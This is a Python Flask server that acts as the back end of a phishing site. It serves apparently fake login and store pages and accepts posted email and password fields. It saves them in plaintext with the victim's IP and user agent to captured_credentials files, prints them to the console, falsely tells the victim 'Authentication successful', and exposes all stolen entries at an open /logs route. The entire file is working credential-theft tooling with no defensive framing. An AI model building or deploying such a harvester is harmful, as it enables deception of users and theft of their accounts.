import os
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__, static_folder=".")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE_JSON = os.path.join(BASE_DIR, "captured_credentials.json")
LOG_FILE_TXT = os.path.join(BASE_DIR, "captured_credentials.log")


def save_credential(entry: dict):
    with open(LOG_FILE_TXT, "a", encoding="utf-8") as f:
        f.write(
            f"[{entry['timestamp']}] IP: {entry['ip']} | Email: {entry['email']} | Password: {entry['password']} | User-Agent: {entry['user_agent']}\n"
        )

    history = []
    if os.path.exists(LOG_FILE_JSON):
        try:
            with open(LOG_FILE_JSON, "r", encoding="utf-8") as f:
                history = json.load(f)
        except Exception:
            history = []

    history.append(entry)
    with open(LOG_FILE_JSON, "w", encoding="utf-8") as f:
        json.dump(history, f, indent=2, ensure_ascii=False)


@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response


@app.route("/", methods=["GET"])
def index():
    return send_from_directory(BASE_DIR, "index.html")


@app.route("/store", methods=["GET"])
@app.route("/store.html", methods=["GET"])
@app.route("/shop", methods=["GET"])
def store():
    return send_from_directory(BASE_DIR, "store.html")


@app.route("/submit", methods=["POST", "OPTIONS"])
@app.route("/login", methods=["POST", "OPTIONS"])
def handle_submit():
    if request.method == "OPTIONS":
        return jsonify({"status": "ok"}), 200

    data = request.get_json(silent=True) or request.form.to_dict() or {}

    email = data.get("email") or data.get("username") or data.get("user") or "N/A"
    password = data.get("password") or data.get("pass") or data.get("pw") or "N/A"
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "Unknown")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    entry = {
        "timestamp": timestamp,
        "ip": client_ip,
        "email": email,
        "password": password,
        "user_agent": user_agent,
        "raw_payload": data,
    }

    save_credential(entry)

    print("\n" + "=" * 65)
    print("CREDENTIALS:")
    print(f"Timestamp:    {timestamp}")
    print(f"Client IP:    {client_ip}")
    print(f"Email/User:   {email}")
    print(f"Password:     {password}")
    print(f"User-Agent:   {user_agent}")
    print("=" * 65 + "\n")

    return jsonify({
        "status": "success",
        "message": "Authentication successful",
        "received": {
            "email": email
        }
    }), 200


@app.route("/logs", methods=["GET"])
def view_logs():
    if not os.path.exists(LOG_FILE_JSON):
        return jsonify({"message": "No credentials captured yet.", "count": 0, "logs": []}), 200

    try:
        with open(LOG_FILE_JSON, "r", encoding="utf-8") as f:
            data = json.load(f)
        return jsonify({"count": len(data), "logs": data}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print(f"Starting server on http://0.0.0.0:{port}")
    print(f"Serving index.html from: {BASE_DIR}")
    print(f"Waiting for requests...\n")
    app.run(host="0.0.0.0", port=port, debug=True)
